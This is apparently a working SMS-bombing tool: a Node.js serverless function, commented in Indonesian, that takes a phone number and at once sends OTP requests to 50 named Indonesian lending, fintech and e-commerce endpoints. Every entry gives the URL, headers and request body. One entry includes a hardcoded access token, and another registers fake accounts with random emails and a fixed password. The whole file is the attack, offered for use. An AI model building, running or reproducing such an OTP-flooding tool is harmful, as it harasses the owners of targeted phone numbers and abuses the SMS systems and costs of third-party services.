// api/blast.js
// Vercel Serverless Function — Node.js
// Blast 50 OTP endpoints SERENTAK server-side (no CORS issues)
// Cooldown 2 menit per nomor disimpan di memory (per instance)

// In-memory cooldown store (per Vercel instance, cukup untuk use case ini)
const cooldownMap = new Map(); // nomor -> expiry timestamp
const COOLDOWN_MS = 120_000;  // 2 menit

// ── Build all 50 endpoint configs ──
function buildEndpoints(nomor) {
  const raw = nomor.replace(/\D/g, '');
  const b   = raw.startsWith('0') ? raw.slice(1) : raw;
  const n0  = '0' + b;
  const c   = '62' + b;
  const p62 = '+62' + b;
  const rn  = () => Math.floor(1000 + Math.random() * 9000);
  const rm  = () => `u${rn()}@gmail.com`;
  const J   = o  => JSON.stringify(o);
  const FD  = o  => new URLSearchParams(Object.entries(o)).toString();

  return [
    /* ── FINTECH / PINJOL LOKAL 30 ── */
    { name: 'UangMe',        method: 'POST', url: 'https://api.uangme.id/api/user/send-otp',                                       headers: { 'Content-Type': 'application/json' },                                                      body: J({ phone: n0, type: 'register' }) },
    { name: 'SpeedCash',     method: 'POST', url: 'https://api.speedcash.co.id/v1/otp/request',                                    headers: { 'Content-Type': 'application/json' },                                                      body: J({ msisdn: c, channel: 'SMS' }) },
    { name: 'Adira Finance', method: 'POST', url: 'https://myadira.adira.co.id/api/otp/send',                                      headers: { 'Content-Type': 'application/json' },                                                      body: J({ phoneNumber: n0, purpose: 'register' }) },
    { name: 'Akulaku',       method: 'POST', url: 'https://www.akulaku.com/api/user/sendSmsCode',                                  headers: { 'Content-Type': 'application/json', 'x-country': 'ID' },                                  body: J({ mobile: c, scene: 'REGISTER' }) },
    { name: 'Kredivo',       method: 'POST', url: 'https://kredivo.com/api/3.0/otp/send',                                         headers: { 'Content-Type': 'application/json' },                                                      body: J({ phone_number: n0 }) },
    { name: 'Kredit Pintar', method: 'POST', url: 'https://kreditpintar.com/api/v1/otp/send',                                     headers: { 'Content-Type': 'application/json' },                                                      body: J({ phone: n0, country_code: '62' }) },
    { name: 'Indodana',      method: 'POST', url: 'https://indodana.com/api/otp/request',                                         headers: { 'Content-Type': 'application/json' },                                                      body: J({ phone_number: n0 }) },
    { name: 'Tunaiku',       method: 'POST', url: 'https://www.tunaiku.com/api/v1/register/otp',                                   headers: { 'Content-Type': 'application/json' },                                                      body: J({ phone: n0 }) },
    { name: 'Julo',          method: 'POST', url: 'https://app.julo.co.id/api/v1/otp',                                            headers: { 'Content-Type': 'application/json' },                                                      body: J({ phone_number: p62 }) },
    { name: 'Easycash',      method: 'POST', url: 'https://www.easycash.co.id/api/v1/user/otp',                                   headers: { 'Content-Type': 'application/json' },                                                      body: J({ phone: n0, channel: 'sms' }) },
    { name: 'Pinjam Modal',  method: 'POST', url: 'https://api.pinjammodal.id/otp/send',                                          headers: { 'Content-Type': 'application/json' },                                                      body: J({ phone: n0 }) },
    { name: 'DanaRupiah',    method: 'POST', url: 'https://danarupiah.id/api/send-otp',                                           headers: { 'Content-Type': 'application/json' },                                                      body: J({ phone_number: n0 }) },
    { name: 'FinPlus',       method: 'POST', url: 'https://www.finplus.co.id/api/otp/request',                                    headers: { 'Content-Type': 'application/json' },                                                      body: J({ mobile: n0, type: 'register' }) },
    { name: 'Maucash',       method: 'GET',  url: `https://japi.maucash.id/welab-user/api/v1/send-sms-code?mobile=${b}&channelType=0`, headers: { 'User-Agent': 'okhttp/3.12.1', 'x-product-code': 'YN-MAUCASH' },                      body: null },
    { name: 'Kredito',       method: 'POST', url: 'https://app-api.kredito.id/client/v1/common/verify-code/send',                 headers: { 'Content-Type': 'application/json' },                                                      body: J({ event: 'default_verification', mobilePhone: b, sender: 'sms' }) },
    { name: 'Rupiah Cepat',  method: 'POST', url: 'https://rupiahcepat.co.id/api/v1/user/otp',                                   headers: { 'Content-Type': 'application/json' },                                                      body: J({ phone: n0, action: 'register' }) },
    { name: 'AdaKami',       method: 'POST', url: 'https://api.adakami.id/v1/otp/send',                                           headers: { 'Content-Type': 'application/json' },                                                      body: J({ phone_number: n0, purpose: 'REGISTER' }) },
    { name: 'Kredinesia',    method: 'POST', url: 'https://api.kredinesia.id/v1/login/verificationCode',                          headers: { 'Content-Type': 'application/json' },                                                      body: J({ phone: nomor, captcha: '' }) },
    { name: 'CashWagon',     method: 'POST', url: 'https://www.cashwagon.id/api/otp/send',                                        headers: { 'Content-Type': 'application/json' },                                                      body: J({ phone: n0, country_code: '+62' }) },
    { name: 'Danacita',      method: 'GET',  url: `https://api.danacita.co.id/users/send_otp/?mobile_phone=${nomor}`,             headers: { 'User-Agent': 'Mozilla/5.0' },                                                             body: null },
    { name: 'Payfazz',       method: 'POST', url: 'https://api.payfazz.com/v2/phoneVerifications',                               headers: { 'Content-Type': 'application/x-www-form-urlencoded' },                                   body: FD({ phone: n0 }) },
    { name: 'Modalku',       method: 'POST', url: 'https://api.modalku.co.id/api/v1/user/otp',                                    headers: { 'Content-Type': 'application/json' },                                                      body: J({ phone_number: p62, purpose: 'registration' }) },
    { name: 'Investree',     method: 'POST', url: 'https://www.investree.id/api/v2/otp/send',                                     headers: { 'Content-Type': 'application/json' },                                                      body: J({ phone: n0, type: 'register' }) },
    { name: 'KoinWorks',     method: 'POST', url: 'https://koinworks.com/api/v2/users/otp',                                       headers: { 'Content-Type': 'application/json' },                                                      body: J({ phone: n0 }) },
    { name: 'Alami',         method: 'POST', url: 'https://app.alamisharia.co.id/api/v1/otp/send',                                headers: { 'Content-Type': 'application/json' },                                                      body: J({ mobile: n0 }) },
    { name: 'Tanifund',      method: 'POST', url: 'https://tanifund.com/api/user/otp',                                            headers: { 'Content-Type': 'application/json' },                                                      body: J({ phone_number: n0 }) },
    { name: 'Akseleran',     method: 'POST', url: 'https://akseleran.co.id/api/v1/user/request-otp',                              headers: { 'Content-Type': 'application/json' },                                                      body: J({ phone_number: n0, channel: 'sms' }) },
    { name: 'Pluang',        method: 'POST', url: 'https://pluang.com/api/v1/auth/otp',                                           headers: { 'Content-Type': 'application/json' },                                                      body: J({ phone: p62, type: 'sms' }) },
    { name: 'iGrow',         method: 'POST', url: 'https://igrow.asia/api/v1/otp/request',                                        headers: { 'Content-Type': 'application/json' },                                                      body: J({ phone: n0, type: 'sms' }) },
    { name: 'Crowde',        method: 'POST', url: 'https://crowde.co/api/v1/otp',                                                 headers: { 'Content-Type': 'application/json' },                                                      body: J({ phone: n0 }) },

    /* ── APP / E-COMMERCE 20 ── */
    { name: 'Tokopedia WA',  method: 'POST', url: 'https://accounts.tokopedia.com/otp/c/ajax/request-wa',                        headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0' },       body: FD({ otp_type: '116', msisdn: nomor, email: '', user_id: '', number_otp_digit: '6' }) },
    { name: 'Tokopedia SMS', method: 'POST', url: 'https://accounts.tokopedia.com/otp/c/ajax/request-sms',                       headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0' },       body: FD({ otp_type: '113', msisdn: nomor, email: '', user_id: '', number_otp_digit: '6' }) },
    { name: 'Bukalapak',     method: 'POST', url: 'https://api.bukalapak.com/phones/register',                                    headers: { 'Content-Type': 'application/json', 'Client-Type': 'mobile-web' },                       body: J({ phone: n0 }) },
    { name: 'Blibli',        method: 'POST', url: 'https://www.blibli.com/backend/common/users/_request-otp',                    headers: { 'Content-Type': 'application/json' },                                                      body: J({ username: n0 }) },
    { name: 'Halodoc',       method: 'POST', url: 'https://www.halodoc.com/api/v1/users/authentication/otp/requests',            headers: { 'Content-Type': 'application/json' },                                                      body: J({ phone_number: p62, channel: 'sms' }) },
    { name: 'Alodokter',     method: 'POST', url: 'https://www.alodokter.com/login-with-phone-number',                            headers: { 'Content-Type': 'application/json' },                                                      body: J({ user: { phone: n0 } }) },
    { name: 'Dekoruma',      method: 'POST', url: 'https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json', headers: { 'Content-Type': 'application/json' },                                               body: J({ phoneNumber: c, platform: 'sms' }) },
    { name: 'KlikIndomaret', method: 'GET',  url: `https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP=${nomor}`, headers: { 'User-Agent': 'Mozilla/5.0' },                                               body: null },
    { name: 'Indihome',      method: 'POST', url: 'https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp',                           headers: { 'Content-Type': 'application/x-www-form-urlencoded' },                                   body: FD({ type: 'hp', msisdn: nomor }) },
    { name: 'Misteraladin',  method: 'POST', url: 'https://m.misteraladin.com/api/members/v2/otp/request',                       headers: { 'Content-Type': 'application/json', 'x-platform': 'mobile-web' },                       body: J({ phone_number_country_code: '62', phone_number: b, type: 'register' }) },
    { name: 'Traveloka',     method: 'POST', url: 'https://api.traveloka.com/v2/user/phone/sendOtp',                              headers: { 'Content-Type': 'application/json', 'x-domain': 'traveloka.com' },                      body: J({ phone: p62, countryCode: '+62' }) },
    { name: 'Tiket.com',     method: 'POST', url: 'https://api.tiket.com/v2/sso/account/mobile/request-otp',                     headers: { 'Content-Type': 'application/json' },                                                      body: J({ phone_number: c, type: 'register' }) },
    { name: 'Sampingan',     method: 'POST', url: 'https://srv3.sampingan.co.id/auth/generate-otp',                               headers: { 'Content-Type': 'application/json' },                                                      body: J({ countryCode: '+62', phoneNumber: b }) },
    { name: 'Ginee',         method: 'POST', url: 'https://accounts.ginee.com/api/iam-service/account/send-verification-code',   headers: { 'Content-Type': 'application/json' },                                                      body: J({ account: n0, countryCode: 'ID', verificationPurpose: 'USER_REGISTRATION', verificationType: 'PHONE' }) },
    { name: 'Oyo Rooms',     method: 'POST', url: 'https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id', headers: { 'Content-Type': 'application/json', 'access_token': 'SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=' }, body: J({ phone: b, country_code: '+62', country_iso_code: 'ID', nod: '4', send_otp: 'true', devise_role: 'Consumer_Guest' }) },
    { name: 'Harvestcake',   method: 'POST', url: 'https://harvestcakes.com/register',                                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },                                   body: FD({ phone: b }) },
    { name: 'Tokomanamana',  method: 'POST', url: 'https://tokomanamana.com/ma/auth/request_token_merchant/',                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },                                   body: FD({ phone: nomor }) },
    { name: 'Harnic',        method: 'POST', url: 'https://harnic.id/login/phone_auth_OTP',                                       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },                                   body: FD({ phone: nomor }) },
    { name: 'Pizzahut ID',   method: 'POST', url: 'https://api-prod.pizzahut.co.id/customer/v1/customer/register',               headers: { 'Content-Type': 'application/json', 'x-platform': 'WEBMOBILE', 'x-channel': '2' },     body: J({ email: rm(), first_name: 'Test', last_name: 'User', password: 'Test@123', phone: n0, birthday: '2000-01-01' }) },
    { name: 'Danacita SMS',  method: 'GET',  url: `https://api.danacita.co.id/users/send_otp/?mobile_phone=${nomor}`,            headers: { 'User-Agent': 'Mozilla/5.0' },                                                             body: null },
  ];
}

// ── Send single request server-side (no CORS!) ──
async function sendOne(ep) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), 9000);
  try {
    const opts = {
      method:  ep.method,
      headers: ep.headers || {},
      signal:  controller.signal,
    };
    if (ep.body) opts.body = ep.body;
    const res = await fetch(ep.url, opts);
    clearTimeout(timer);
    return { name: ep.name, ok: true, status: res.status };
  } catch (err) {
    clearTimeout(timer);
    return { name: ep.name, ok: false, status: 0, error: err.message };
  }
}

// ── Main handler ──
export default async function handler(req, res) {
  // CORS headers (untuk frontend bisa hit API ini)
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  // Parse body
  let body;
  try {
    body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
  } catch {
    return res.status(400).json({ error: 'Invalid JSON' });
  }

  const { nomor } = body || {};
  if (!nomor || nomor.length < 9) {
    return res.status(400).json({ error: 'Nomor tidak valid' });
  }

  // ── Cek cooldown ──
  const now     = Date.now();
  const expiry  = cooldownMap.get(nomor) || 0;
  const cdLeft  = Math.ceil((expiry - now) / 1000);

  if (cdLeft > 0) {
    return res.status(429).json({
      error:     'cooldown',
      cooldown:  cdLeft,
      message:   `Cooldown aktif. Tunggu ${Math.floor(cdLeft/60)}:${String(cdLeft%60).padStart(2,'0')} lagi.`
    });
  }

  // ── Set cooldown SEBELUM blast (cegah double-click) ──
  cooldownMap.set(nomor, now + COOLDOWN_MS);

  // ── Blast semua 50 SERENTAK ──
  const endpoints = buildEndpoints(nomor);
  const results   = await Promise.all(endpoints.map(sendOne));

  // Hitung stats
  const ok   = results.filter(r => r.ok && r.status >= 100 && r.status < 500).length;
  const fail = results.length - ok;

  return res.status(200).json({
    success:  true,
    total:    results.length,
    ok,
    fail,
    cooldown: COOLDOWN_MS / 1000,
    results,
  });
}
